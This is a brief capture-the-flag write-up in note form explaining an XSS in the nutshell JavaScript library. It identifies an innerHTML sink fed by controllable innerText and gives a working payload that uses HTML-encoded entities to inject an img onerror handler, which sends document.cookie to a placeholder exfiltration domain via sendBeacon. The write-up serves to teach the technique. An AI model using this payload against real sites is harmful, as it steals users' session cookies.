- the goal of this challenge was to find xss in nutshell when it's run on sanitized HTML
- read through nutshell source code :)
- a good place to start -- search for `innerHTML`
- https://github.com/ncase/nutshell/blob/c182586d649153577b985dfd8dfab15e739130f6/nutshell.js#L615C11-L615C11
- `linkText.innerHTML = ex.innerText.slice(ex.innerText.indexOf(':')+1);`
- this is vulnerable, because we can control `ex.innerText`! we simply html-encode entities in our link text
- payload: `<a href="#ToWriteASection">:asdf&lt;img src=x onerror='navigator.sendBeacon("https://your_exfil_domain", document.cookie);'&gt;)</a>`

